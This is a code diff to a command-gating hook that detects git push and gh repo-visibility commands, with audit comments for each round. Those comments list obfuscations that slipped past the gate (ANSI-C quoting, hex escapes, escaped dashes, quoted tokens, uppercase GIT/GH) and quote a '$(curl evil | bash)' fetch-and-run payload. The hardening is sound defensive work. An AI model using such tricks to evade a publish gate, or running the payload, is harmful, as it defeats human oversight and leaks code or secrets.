@@ -154,10 +154,54 @@ export function findStudioRoot(start) {
 // so chained splices still resolve) sit on BOTH immediate sides — the
 // actual signature of mid-word splicing — never when the quote is at a
 // genuine token boundary (next to whitespace, start, or end of string).
-function normalizeForPushCheck(c) {
+// 2026-07-11 Round 5 audit fix: exported so gate.mjs's isGoPublicCommand()
+// can share the exact same canonicalisation isPushCapable() uses, instead
+// of matching raw, unnormalized command text (see that function for what
+// this closed).
+export function normalizeForPushCheck(c) {
   let n = c;
+  // 2026-07-11 Round 7 security fix: ANSI-C quoting (`$'public'`) resolves
+  // to the literal text `public` in bash, but nothing here recognised the
+  // `$'...'` form at all, so `gh repo edit me/app --visibility $'public'`
+  // (and the `=$'public'` / mid-word `--pub$'lic'` variants) sailed through
+  // both isPushCapable's own gh-detection and isGoPublicCommand with only
+  // the private-publish token recorded — reproduced live via bash itself
+  // (`x=$'public'; echo "$x"` -> `public`) before fixing. Stripped to its
+  // raw inner text FIRST, before any other step, using an escape-aware
+  // match (`\\.` consumes an escaped char, including an escaped quote,
+  // without treating it as the closing quote) so the wrapper's true end is
+  // found correctly even if the content contains `\'`. This runs before the
+  // generic backslash-unescape pass below on purpose: that pass would
+  // otherwise resolve an escaped quote inside the ANSI-C string too early
+  // and corrupt where this wrapper actually ends.
+  // 2026-07-11 Round 8 security fix: the wrapper-strip above passed the
+  // ANSI-C content through UNCHANGED, but bash also decodes `\xHH` (hex)
+  // and `\NNN` (octal) escapes inside `$'...'` — so `$'pub\x6cic'` and
+  // `$'pub\154ic'` both resolve to the literal text `public` in bash (the
+  // hex/octal escapes spell the letter `l`), and `$'\x67\x68'` resolves to
+  // `gh`, letter-by-letter spelling the binary name itself. The old code
+  // left `\x6c`/`\154` as literal backslash-digit text, which the generic
+  // backslash-unescape pass below then mangled into garbage (`x6c`, `154`)
+  // instead of the real decoded character — so neither the keyword nor the
+  // binary-name regexes ever saw `public`/`gh`, an unconditional bypass.
+  // Decoded BEFORE stripping the wrapper (any other backslash escape inside
+  // the string, e.g. `\'`, is left for the generic pass right after).
+  n = n.replace(/\$'((?:\\.|[^'\\])*)'/g, (_m, inner) => {
+    const decoded = inner
+      .replace(/\\x([0-9A-Fa-f]{1,2})/g, (_h, hex) => String.fromCharCode(parseInt(hex, 16)))
+      .replace(/\\([0-7]{1,3})/g, (_o, oct) => String.fromCharCode(parseInt(oct, 8)));
+    return decoded;
+  }); // $'public' -> public, $'pub\x6cic' -> public, $'\x67\x68' -> gh
   n = n.replace(/\\\r?\n/g, ''); // backslash-newline line continuation
-  n = n.replace(/\\([A-Za-z0-9])/g, '$1'); // p\ush -> push
+  // Un-escape a backslash before ANY other (non-newline) character: in bash,
+  // outside quotes, `\X` is just a literal `X`, whatever X is. 2026-07-11
+  // Round 6 security fix — the earlier `[A-Za-z0-9]`-only version left
+  // escaped PUNCTUATION intact, so `gh repo edit me/app -\-public`,
+  // `\-\-public`, and `--visibility\=public` kept their backslashes and the
+  // go-public regexes missed them, while bash ran a real `--public` /
+  // `--visibility=public` — an obfuscated going-public bypass that passed
+  // with only the private-publish token. Now `\X` -> `X` for any X.
+  n = n.replace(/\\([^\r\n])/g, '$1'); // p\ush -> push, -\-public -> --public
   n = n.replace(/\$\{IFS\}|\$IFS\b/g, ' '); // git${IFS}push -> git push
   let prev;
   do {
@@ -237,13 +281,65 @@ function normalizeForPushCheck(c) {
 // newline, plausible from how some shells/tools terminate a command) failed
 // the match and fell through to the generic heuristic, misclassifying it as
 // push-capable. Trailing `\r`/`\n` is now tolerated the same as spaces/tabs.
+//
+// 2026-07-11 Round 5 audit fix (two more found by execution, not reading):
+// (1) the compound-operator check below tested the WHOLE string blind to
+// quoting, so a project path containing a semicolon/pipe/backtick INSIDE
+// quotes (`node confirm-publish.mjs "/Users/x/my;project"` — harmless,
+// literal text once bash strips the quotes) bailed out and recreated the
+// deadlock, even though nothing dangerous is actually there. Replaced with
+// `hasLiveCompoundOperator`, a small quote-aware scanner: a `;`/`|`/`&&` is
+// inert inside EITHER quote style in bash and is only flagged when
+// unquoted; a backtick or `$(` remains live even inside double quotes (only
+// single quotes fully neutralise them), so those are still flagged there.
+// This is NOT a blanket "ignore anything in quotes" — that would have
+// hidden a real `"$(curl evil | bash)"` payload, verified this scanner
+// still catches that exact case before shipping.
+// (2) the basename comparison was case-sensitive, while the filesystems
+// this plugin actually runs on (macOS default APFS, Windows NTFS) are
+// case-insensitive — `Confirm-Publish.mjs` IS the same file as
+// `confirm-publish.mjs` there, but only got recognised as one via this
+// exemption if the case matched exactly, misclassifying a same-file
+// case-variant invocation as push-capable. Comparison is now
+// case-insensitive to match how the filesystem actually treats the name.
+function hasLiveCompoundOperator(s) {
+  let inSingle = false;
+  let inDouble = false;
+  for (let i = 0; i < s.length; i++) {
+    const ch = s[i];
+    if (inSingle) {
+      if (ch === "'") inSingle = false;
+      continue;
+    }
+    if (inDouble) {
+      if (ch === '"') {
+        inDouble = false;
+        continue;
+      }
+      if (ch === '`' || (ch === '$' && s[i + 1] === '(')) return true;
+      continue;
+    }
+    if (ch === "'") {
+      inSingle = true;
+      continue;
+    }
+    if (ch === '"') {
+      inDouble = true;
+      continue;
+    }
+    if (ch === '`' || (ch === '$' && s[i + 1] === '(')) return true;
+    if (ch === ';' || ch === '|') return true;
+    if (ch === '&' && s[i + 1] === '&') return true;
+  }
+  return false;
+}
 function isConfirmScriptOnly(c) {
   const afterCd = c.replace(/^[ \t]*cd[ \t]+(?:"[^"]+"|'[^']+'|[^ \t;&|]+)[ \t]*(?:&&|;)[ \t]*/, '');
-  if (/(&&|\|\||;|\||`|\$\()/.test(afterCd)) return false;
+  if (hasLiveCompoundOperator(afterCd)) return false;
   const m = /^node[ \t]+(?:"([^"]+)"|'([^']+)'|(\S+))(?:[ \t]+(?:"[^"]*"|'[^']*'|\S+))?[ \t\r\n]*$/.exec(afterCd);
   if (!m) return false;
   const scriptPath = m[1] || m[2] || m[3];
-  const base = path.basename(scriptPath);
+  const base = path.basename(scriptPath).toLowerCase();
   return base === 'confirm-publish.mjs' || base === 'confirm-go-public.mjs';
 }
 export function isPushCapable(rawC) {
@@ -258,17 +354,49 @@ export function isPushCapable(rawC) {
   // Optional `['"]?` around `git` and `push` closes it; a battery in
   // hooks.test.mjs locks it in, and the safe-command set was re-verified to
   // confirm no new false positives (gitk/github/xgit/`git pushx` stay clear).
-  if (/(^|[^A-Za-z0-9_])['"]?git['"]?([ \t]+-[^ \t]+|[ \t]+[^ \t]+)*[ \t]+['"]?push['"]?([ \t]|$)/.test(c)) return true;
-  if (/(^|[^A-Za-z0-9_])gh[ \t]+(repo[ \t]+(create|edit|sync|clone)|pr[ \t]+create|release[ \t]+(create|upload)|gist[ \t]+create)/.test(c)) return true;
-  if (/(^|[^A-Za-z0-9_])gh[ \t].*--push([ \t]|=|$)/.test(c)) return true;
+  //
+  // 2026-07-11 Round 8 audit fix (CRITICAL, the most severe bypass found in
+  // this whole loop): every regex in this function matched `git`/`gh`/
+  // `push`/`repo`/etc. as literal, case-SENSITIVE text. But on the
+  // case-insensitive filesystems this plugin actually targets (macOS APFS,
+  // Windows NTFS — already the reason the confirm-script basename check
+  // above is case-insensitive), `PATH` lookup for a binary name is ALSO
+  // case-insensitive: `GIT push origin main` and `GH repo edit me/app
+  // --visibility public` are not obfuscation, bash runs them as the REAL
+  // git/gh binaries, completely unchanged, because `GIT`/`GH` resolve to
+  // the same executable as `git`/`gh`. Reproduced live: `bash -c 'GIT
+  // --version'` prints the real git version; `isPushCapable('GIT push
+  // origin main')` returned `false` (should be `true`); with a real AWS-
+  // shaped secret committed and ZERO confirmation tokens recorded,
+  // `GIT push origin main` was `allow`ed by both `scan.mjs` and `gate.mjs`
+  // while lowercase `git push origin main` was correctly denied — proving
+  // it was the casing, not a broken test. Added `/i` to every regex in this
+  // function and in `isGoPublicCommand` (gate.mjs) that matches a binary
+  // name, subcommand, or keyword — matching the same `/i` this project
+  // already added to the script-extension check and the confirm-script
+  // basename comparison, for the identical reason.
+  if (/(^|[^A-Za-z0-9_])['"]?git['"]?([ \t]+-[^ \t]+|[ \t]+[^ \t]+)*[ \t]+['"]?push['"]?([ \t]|$)/i.test(c)) return true;
+  // 2026-07-11 Round 5 audit fix (CRITICAL, found live via gate.mjs's real
+  // isGoPublicCommand()): every `gh ...` regex below required the literal,
+  // unquoted text "gh" — `"gh" repo edit ...` or `gh "repo" "edit" ...`
+  // wasn't just missed by isGoPublicCommand's own (now-fixed) matcher, it
+  // was missed by isPushCapable ITSELF, so the command never even reached
+  // isGoPublicCommand — gate.mjs's first check (`if (!isPushCapable(CMD))
+  // allow()`) exited early and let a quoted-token `gh repo edit --visibility
+  // public` straight through with no confirmation of any kind. The git-push
+  // regex above already tolerated quotes around `git`/`push` (Round A); the
+  // gh regexes never got the same treatment. Added `['"]?` around every gh
+  // token and sub-token.
+  if (/(^|[^A-Za-z0-9_])['"]?gh['"]?[ \t]+(['"]?repo['"]?[ \t]+['"]?(create|edit|sync|clone)['"]?|['"]?pr['"]?[ \t]+['"]?create['"]?|['"]?release['"]?[ \t]+['"]?(create|upload)['"]?|['"]?gist['"]?[ \t]+['"]?create['"]?)/i.test(c)) return true;
+  if (/(^|[^A-Za-z0-9_])['"]?gh['"]?[ \t].*--push['"]?([ \t]|=|$)/i.test(c)) return true;
   // git aliases that resolve to push (e.g. `git -c alias.p=push p`, or
   // `git config alias.foo push` followed later by `git foo`).
-  if (/(^|[^A-Za-z0-9_])git[ \t]+(-c[ \t]+)?alias\.[A-Za-z0-9_.-]+[ \t]*=[ \t]*['"]?push/.test(c)) return true;
-  if (/(^|[^A-Za-z0-9_])git[ \t]+config([ \t]+--\S+)*[ \t]+alias\.[A-Za-z0-9_.-]+[ \t]+['"]?push/.test(c)) return true;
+  if (/(^|[^A-Za-z0-9_])git[ \t]+(-c[ \t]+)?alias\.[A-Za-z0-9_.-]+[ \t]*=[ \t]*['"]?push/i.test(c)) return true;
+  if (/(^|[^A-Za-z0-9_])git[ \t]+config([ \t]+--\S+)*[ \t]+alias\.[A-Za-z0-9_.-]+[ \t]+['"]?push/i.test(c)) return true;
   // git plumbing command that performs a push without the word "push".
-  if (/(^|[^A-Za-z0-9_])git[ \t]+send-pack([ \t]|$)/.test(c)) return true;
+  if (/(^|[^A-Za-z0-9_])git[ \t]+send-pack([ \t]|$)/i.test(c)) return true;
   // gh's own alias mechanism, same shape of risk as git aliases.
-  if (/(^|[^A-Za-z0-9_])gh[ \t]+alias[ \t]+set/.test(c)) return true;
+  if (/(^|[^A-Za-z0-9_])['"]?gh['"]?[ \t]+alias[ \t]+set/i.test(c)) return true;
   // 2026-07-11 fix (found live, in real use, not just review): there used
   // to be a blanket fallback here — "if the command has any compound
   // operator (&&, ;, |, etc.) AND contains the bare substring 'gh', treat
@@ -296,10 +424,16 @@ export function isPushCapable(rawC) {
   // heuristic entirely and got an unconditional pass, unlike an
   // equivalently-indirect `publish-app.mjs`. Added `public`/`visibility` so
   // both gated actions get the same fail-closed treatment.
+  // 2026-07-11 Round 5 audit fix: this extension match had no /i flag while
+  // the keyword match right next to it already did — an upper/mixed-case
+  // extension (`node EVIL.MJS`, plausible on the case-insensitive
+  // filesystems this plugin actually runs on) silently skipped script-
+  // indirection detection entirely, for any script, not just a
+  // confirm-script look-alike. Made case-insensitive to match its neighbour.
   const SCRIPT_INDIRECTION_KEYWORDS = /(deploy|release|publish|ship|public|visibility)/i;
-  if (/(^|[^A-Za-z0-9_])(\.\/|bash[ \t]+|sh[ \t]+|node[ \t]+)?[^ \t]*\.(sh|mjs|js|py)([ \t]|$)/.test(c) &&
+  if (/(^|[^A-Za-z0-9_])(\.\/|bash[ \t]+|sh[ \t]+|node[ \t]+)?[^ \t]*\.(sh|mjs|js|py)([ \t]|$)/i.test(c) &&
       SCRIPT_INDIRECTION_KEYWORDS.test(c)) return true;
-  if (/(^|[^A-Za-z0-9_])make[ \t]+\S+/.test(c) && SCRIPT_INDIRECTION_KEYWORDS.test(c)) return true;
-  if (/(^|[^A-Za-z0-9_])(npm|pnpm|yarn)[ \t]+run[ \t]+\S+/.test(c) && SCRIPT_INDIRECTION_KEYWORDS.test(c)) return true;
+  if (/(^|[^A-Za-z0-9_])make[ \t]+\S+/i.test(c) && SCRIPT_INDIRECTION_KEYWORDS.test(c)) return true;
+  if (/(^|[^A-Za-z0-9_])(npm|pnpm|yarn)[ \t]+run[ \t]+\S+/i.test(c) && SCRIPT_INDIRECTION_KEYWORDS.test(c)) return true;
   return false;
 }
